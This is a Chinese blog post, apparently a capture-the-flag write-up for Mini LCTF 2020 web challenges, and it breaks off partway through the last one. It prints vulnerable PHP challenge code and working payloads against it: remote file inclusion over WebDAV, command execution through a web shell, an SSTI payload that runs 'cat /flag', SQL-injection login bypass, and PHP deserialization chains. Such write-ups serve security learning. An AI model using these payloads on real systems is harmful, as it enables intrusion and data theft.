@@ -1,0 +1,868 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>minilctf - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="minilctf">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-05-15 08:53" pubdate>
+        2020年5月15日 早上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      41
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">minilctf</h1>
+            
+            <div class="markdown-body">
+              <blockquote>
+<p>首发于<a target="_blank" rel="noopener" href="https://www.sec-in.com/">https://www.sec-in.com/</a></p>
+<p>Mini LCTF 2020是西电的招新赛，题目比较简单(假的)，但对于本web菜狗来说也学到了很多，要经常提醒自己要多做总结，注意细节 </p>
+</blockquote>
+<h1 id="include"><a href="#include" class="headerlink" title="include"></a>include</h1><p>打开是源码</p>
+<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
+error_reporting(<span class="hljs-number">0</span>);
+<span class="hljs-variable">$id</span>= <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;ID&quot;</span>];
+show_source(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-keyword">if</span>(unserialize(<span class="hljs-variable">$id</span>) === <span class="hljs-string">&quot;<span class="hljs-subst">$admin</span>&quot;</span>)
+&#123;
+    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;next.php&quot;</span>);
+    <span class="hljs-variable">$key</span> = @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>];
+    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/p@d/is&#x27;</span>,<span class="hljs-variable">$key</span>))&#123;
+        show_source(<span class="hljs-string">&quot;next.php&quot;</span>);
+    &#125;
+&#125;
+<span class="hljs-meta">?&gt;</span>
+
+<span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">//hint</span>
+<span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;m0ectf&#x27;</span>;
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<p>第一层直接传<code>ID</code>，考验基本工吧,传参这些的</p>
+<p><img src="https://s1.ax1x.com/2020/05/15/Yr5fdU.png" srcset="/img/loading.gif" alt="Yr5fdU.png"></p>
+<p>来到第二层  访问<code>TE9PS0hFUkU=.html</code>,会发现302转跳到百度，抓下包看有什么</p>
+<pre><code class="hljs xml"><span class="hljs-comment">&lt;!--</span>
+<span class="hljs-comment">T2glMjFHbyUyMCUyMGYxbmExLnBocA==</span>
+<span class="hljs-comment">--&gt;</span>
+base64后 Oh%21Go%20%20f1na1.php</code></pre>
+
+
+
+<p>第三层 <code>f1na1.php</code>有一个文件读取，但是有过滤，测试大小写可以绕对php的绕过</p>
+<p>伪协议读下源码</p>
+<pre><code class="hljs php"><span class="hljs-comment">#/f1na1.php?file=Php://filter/read=convert.base64-encode/resource=f1na1.Php</span>
+
+<span class="hljs-meta">&lt;?php</span>
+	error_reporting(<span class="hljs-number">0</span>);
+	<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[file])&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;./f1na1.php?file=hint.php&quot;&gt;See hint.&lt;/a&gt;&#x27;</span>;&#125;
+	<span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];
+	<span class="hljs-keyword">if</span>(strstr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||stristr(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;tp&quot;</span>)||stristr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||stristr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>)||strstr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;php&quot;</span>))&#123;
+		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!&quot;</span>;
+		<span class="hljs-keyword">exit</span>();
+	&#125;
+	<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); 
+<span class="hljs-meta">?&gt;</span>
+
+<span class="hljs-comment"># hint.php</span>
+&lt;p&gt;Flag is here.&lt;/p&gt;</code></pre>
+
+<p>f1na1.php中<code>stristr</code>不分大小写，<code>strstr</code>区分大小写，所以大小写可以绕php，但是绕不过其他的</p>
+<p>hint.php 中可以提示有flag在这个目录中，但是文件名不知道，目标就是扫目录了</p>
+<p>引入一个知识点    </p>
+<p>RFI 绕过 URL 包含限制 getshell</p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/923/">https://paper.seebug.org/923/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201060#h3-9c">https://www.anquanke.com/post/id/201060#h3-9c</a></p>
+<p><code>php version 5.2</code>以后<code>php.ini</code>配置中默认关闭了<code>allow_url_include</code>,而RFI包含执行需要</p>
+<pre><code class="hljs ini"><span class="hljs-attr">allow_url_fopen</span>=<span class="hljs-literal">On</span>
+<span class="hljs-attr">allow_url_include</span>=<span class="hljs-literal">On</span></code></pre>
+
+<p> <code>allow_url_fopen</code>和<code>allow_url_include</code>主要是针对两种协议起作用：<code>http://</code>、 <code>ftp://</code>，可以通过<code>SMB</code>、<code>WebDAV</code>绕过此限制</p>
+<p>阿里云服务器上打不开445端口，所以放弃了<code>SMB</code>搭建，转向<code>WebDAV</code></p>
+<p>doker搭建</p>
+<pre><code class="hljs gradle">docker run -v ~<span class="hljs-regexp">/webdav:/</span>var<span class="hljs-regexp">/lib/</span>dav -e ANONYMOUS_METHODS=GET,<span class="hljs-keyword">OPTIONS</span>,PROPFIND -e LOCATION=<span class="hljs-regexp">/webdav -p 80:80 --rm --name webdav bytemark/</span>webdav
+
+<span class="hljs-regexp">/webdav/</span>data里写共享文件</code></pre>
+
+<p>本来是想写shell的，但是没得权限写shell，扫一下目录</p>
+<pre><code class="hljs php"><span class="hljs-comment">#/webdav/data/5</span>
+<span class="hljs-meta">&lt;?php</span>
+system(<span class="hljs-string">&quot;dir&quot;</span>);
+phpinfo();</code></pre>
+
+<p>包含一下</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/YsiUaD"><img src="https://s1.ax1x.com/2020/05/15/YsiUaD.png" srcset="/img/loading.gif" alt="YsiUaD.png"></a></p>
+<p>有一个<code>ZmxhZ2ZsQGcxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjM.txt</code>,直接访问就是flag</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">Congratulations</span>! BTW: Don&#x27;t break my env tks :P
+
+<span class="hljs-attribute">Here</span> is flag:
+<span class="hljs-attribute">minil</span>&#123;ad<span class="hljs-number">87</span>a<span class="hljs-number">2</span>c<span class="hljs-number">369637</span>dc<span class="hljs-number">51895</span>cb<span class="hljs-number">557</span>c<span class="hljs-number">98481</span>c&#125;</code></pre>
+
+
+
+<h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p>直接给了shell</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>system(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])<span class="hljs-meta">?&gt;</span>
+<span class="hljs-meta">&lt;?</span>highlight_file(<span class="hljs-keyword">__FILE__</span>)<span class="hljs-meta">?&gt;</span>
+<span class="hljs-meta">&lt;?</span><span class="hljs-comment">//hint: 题目机子没有外网</span></code></pre>
+
+<p><code>ls /</code>有个<code>/readflag</code>,执行但是并没有输出flag，试试输入一个yes</p>
+<pre><code class="hljs routeros">?<span class="hljs-attribute">a</span>=/readflag
+<span class="hljs-keyword">do</span> you want the flag? 
+
+?<span class="hljs-attribute">a</span>=echo <span class="hljs-literal">yes</span> | /readflag
+<span class="hljs-keyword">do</span> you want the flag?really?
+
+?<span class="hljs-attribute">a</span>=echo <span class="hljs-literal">yes</span> <span class="hljs-literal">yes</span>| /readflag
+<span class="hljs-keyword">do</span> you want the flag? really? then calculate 11+<span class="hljs-attribute">62</span>=? 
+
+?<span class="hljs-attribute">a</span>=echo <span class="hljs-literal">yes</span> <span class="hljs-literal">yes</span> 124| /readflag
+写个脚本爆破就行</code></pre>
+
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+
+u = <span class="hljs-string">&#x27;http://d1eb8b9d09bb156cbef0926a56b23c7d.challenge.mini.lctf.online:1080/&#x27;</span>
+
+<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+    t = requests.get(u, params=&#123;
+        <span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-string">&#x27;echo yes yes 88 | /readflag&#x27;</span>
+    &#125;).text
+
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;mini&quot;</span> <span class="hljs-keyword">in</span> t:
+        print(t)</code></pre>
+
+<p>还有种非预期，<code>echo yes| /readflag</code> 爆破也行，当第一个参数为0可以出flag，最后问出题人是因为重复用了一个变量导致非预期</p>
+<h1 id="Personal-IP-Query"><a href="#Personal-IP-Query" class="headerlink" title="Personal_IP_Query"></a>Personal_IP_Query</h1><p>题目提示 <code>Your IP</code>  猜测是<code>X-Forwarded-For</code>对输出有影响，最后测出是ssti,但是过滤了很多东西像下划线，引号全没了，只能用传参来绕</p>
+<pre><code class="hljs python">?c=__class__&amp;b=__bases__&amp;s=__subclasses__&amp;i=__init__&amp;g=__globals__&amp;bt=__builtins__&amp;d=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()
+
+X-Forwarded-For: &#123;&#123;[][request.args.c][request.args.b][<span class="hljs-number">0</span>][request.args.s]()[<span class="hljs-number">76</span>][request.args.i][request.args.g][request.args.bt].<span class="hljs-built_in">eval</span>(request.args.d)&#125;&#125;
+</code></pre>
+
+<p>将其中的<code>request.args</code>改为<code>request.values</code>则利用post的方式进行传参绕过</p>
+<h1 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h1><p>第一层注入 </p>
+<p><code>1&quot;|| 1 #</code>可以绕过登录，并且回回显用户名密码 ，然而过滤了很多东西，无法正常的查数据，这里可以结合回显用一手offset</p>
+<p><code>payload : logname=&quot; || 1 limit 1 offset 3#&amp;logpass=123</code></p>
+<p>回显 </p>
+<p><code>alert(&#39;Username:Flag_1s_heRe \nPassword:goto /flag327a6c4304a&#39;)</code></p>
+<p>第二层 /flag327a6c4304a/</p>
+<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">include</span> (<span class="hljs-string">&#x27;flag.php&#x27;</span>);
+error_reporting(<span class="hljs-number">0</span>);
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$payload</span></span>)</span>&#123;
+    <span class="hljs-variable">$key</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;xdsec&#x27;</span>);
+    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$key</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;
+    <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;hack!!!!&#x27;</span>,<span class="hljs-variable">$payload</span>);
+&#125;
+
+<span class="hljs-variable">$payload</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>];
+<span class="hljs-variable">$fuck</span>[<span class="hljs-string">&#x27;mini&#x27;</span>]=<span class="hljs-string">&#x27;nb666&#x27;</span>;
+<span class="hljs-variable">$fuck</span>[<span class="hljs-string">&#x27;V0n&#x27;</span>]=<span class="hljs-string">&#x27;no_girlfriend&#x27;</span>;
+
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$payload</span>)) &#123;
+    <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$payload</span>, <span class="hljs-string">&#x27;php&#x27;</span>) &gt;=<span class="hljs-number">0</span> || strpos(<span class="hljs-variable">$payload</span>, <span class="hljs-string">&#x27;flag&#x27;</span>)&gt;=<span class="hljs-number">0</span> || strpos(<span class="hljs-variable">$payload</span>, <span class="hljs-string">&#x27;xdsec&#x27;</span>)&gt;=<span class="hljs-number">0</span>) &#123;
+        <span class="hljs-variable">$fuck</span>[<span class="hljs-string">&#x27;mini&#x27;</span>]=<span class="hljs-variable">$payload</span>;
+        var_dump(filter(serialize(<span class="hljs-variable">$fuck</span>)));
+        <span class="hljs-variable">$fuck</span>=unserialize(filter(serialize(<span class="hljs-variable">$fuck</span>)));
+        var_dump(<span class="hljs-variable">$fuck</span>);
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$fuck</span>[<span class="hljs-string">&#x27;V0n&#x27;</span>] === <span class="hljs-string">&#x27;has_girlfriend&#x27;</span>) &#123;
+            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;fuck_no_girlfriend!!!&#x27;</span>;
+        &#125;
+    &#125;<span class="hljs-keyword">else</span>&#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;fuck_no_key!!!&#x27;</span>;
+    &#125;
+&#125;<span class="hljs-keyword">else</span>&#123;
+    highlight_file(<span class="hljs-keyword">__FILE__</span>);
+&#125;</code></pre>
+
+<p>随便传一个payload就会出序列化值，然后就就平常的反序列化逃逸</p>
+<pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;mini&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;1213&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;V0n&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;no_girlfriend&quot;</span>;&#125;
+
+<span class="hljs-comment">#目标序列化</span>
+a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;mini&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;1213&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;V0n&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;has_girlfriend&quot;</span>;&#125;
+
+<span class="hljs-comment"># mini 可控，需要挤出 &quot;;s:3:&quot;V0n&quot;;s:14:&quot;has_girlfriend&quot;;&#125; 35个字符, 7*php -&gt; hack!!!! 刚好 7*5=35，那么传入payload  </span>
+phpphpphpphpphpphpphp<span class="hljs-string">&quot;;s:3:&quot;</span>V0n<span class="hljs-string">&quot;;s:14:&quot;</span>has_girlfriend<span class="hljs-string">&quot;;&#125;</span></code></pre>
+
+<p>就有flag了</p>
+<h1 id="Let’s-Play-Dolls"><a href="#Let’s-Play-Dolls" class="headerlink" title="Let’s_Play_Dolls"></a>Let’s_Play_Dolls</h1><p>pop链然后无参数rce</p>
+<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
+error_reporting(<span class="hljs-number">0</span>);
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;
+    unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);
+&#125;
+<span class="hljs-keyword">else</span>&#123;
+    highlight_file(<span class="hljs-keyword">__FILE__</span>);
+&#125;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo1</span></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;&#x27;</span>;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;var=<span class="hljs-string">&#x27;phpinfo();&#x27;</span>;
+    &#125;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;var)) &#123; 
+            <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/header|bin|hex|oct|dec|na|eval|exec|system|pass/i&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;var))&#123;
+                <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;var);
+            &#125;  
+            <span class="hljs-keyword">else</span>&#123;
+                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacked!&quot;</span>);
+            &#125;  
+        &#125;
+
+    &#125;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;var=<span class="hljs-string">&quot;phpinfo();&quot;</span>;
+    &#125;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__desctuct</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;desctuct foo1&lt;/br&gt;&#x27;</span>;
+    &#125;
+&#125;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo2</span></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;var=<span class="hljs-string">&#x27;hi&#x27;</span>;
+        <span class="hljs-keyword">$this</span>-&gt;obj=<span class="hljs-literal">null</span>;
+    &#125;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;obj-&gt;execute();
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;var;
+    &#125;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__desctuct</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;desctuct foo2&lt;/br&gt;&#x27;</span>;
+    &#125;
+&#125;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo3</span></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;var=<span class="hljs-string">&quot;index.php&quot;</span>;
+    &#125;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-keyword">$this</span>-&gt;var))&#123;
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;var.<span class="hljs-string">&quot;exist&lt;/br&gt;&quot;</span>;
+        &#125;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;desctuct foo3&lt;/br&gt;&quot;</span>;
+    &#125;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;hi&quot;</span>);
+    &#125;
+&#125;</code></pre>
+
+<p>payload</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo1</span></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;&#x27;</span>;
+&#125;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo2</span></span>
+<span class="hljs-class"></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;
+&#125;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo3</span></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;
+&#125;
+
+<span class="hljs-variable">$f1</span> = <span class="hljs-keyword">new</span> foo1();
+<span class="hljs-variable">$f2</span> = <span class="hljs-keyword">new</span> foo2();
+<span class="hljs-variable">$f3</span> = <span class="hljs-keyword">new</span> foo3();
+<span class="hljs-variable">$f3</span> -&gt;var = <span class="hljs-variable">$f2</span>;
+<span class="hljs-variable">$f2</span> -&gt;obj = <span class="hljs-variable">$f1</span>;
+<span class="hljs-variable">$f1</span> -&gt;var = <span class="hljs-string">&quot;var_dump(scandir(getcwd()));&quot;</span>;
+
+<span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$f3</span>);
+
+<span class="hljs-comment"># O:4:&quot;foo3&quot;:1:&#123;s:3:&quot;var&quot;;O:4:&quot;foo2&quot;:2:&#123;s:3:&quot;var&quot;;N;s:3:&quot;obj&quot;;O:4:&quot;foo1&quot;:1:&#123;s:3:&quot;var&quot;;s:28:&quot;var_dump(scandir(getcwd()));&quot;;&#125;&#125;&#125;</span>
+绕一下wakeup 
+最后payload O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;foo3&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;foo2&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;foo1&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;s:<span class="hljs-number">28</span>:<span class="hljs-string">&quot;var_dump(scandir(getcwd()));&quot;</span>;&#125;&#125;&#125;</code></pre>
+
+<p>遍历出 youCanGet1tmaybe文件 直接访问flag到手</p>
+<h1 id="are-you-reclu3e"><a href="#are-you-reclu3e" class="headerlink" title="are you reclu3e?"></a>are you reclu3e?</h1><p>开始没有思路做，后面提示了vim ，就想到swp文件，下到了index.php 和login.php源码</p>
+<pre><code class="hljs php"><span class="hljs-comment"># index.php</span>
+<span class="hljs-meta">&lt;?php</span>
+    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<span class="hljs-comment">//$flag=&quot;minilctf&#123;****&#125;&quot;;</span>
+    session_start();
+    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>])) &#123;
+        <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;loginForm.html&quot;</span>;
+    &#125;
+    <span class="hljs-keyword">else</span>&#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h1&gt;Hello, reclu3e!&lt;/h1&gt;&#x27;</span>;
+        <span class="hljs-variable">$p</span>=unserialize(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;p&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;p&quot;</span>]:<span class="hljs-string">&quot;&quot;</span>);
+    &#125;
+<span class="hljs-meta">?&gt;</span>
+<span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">person</span></span>&#123;
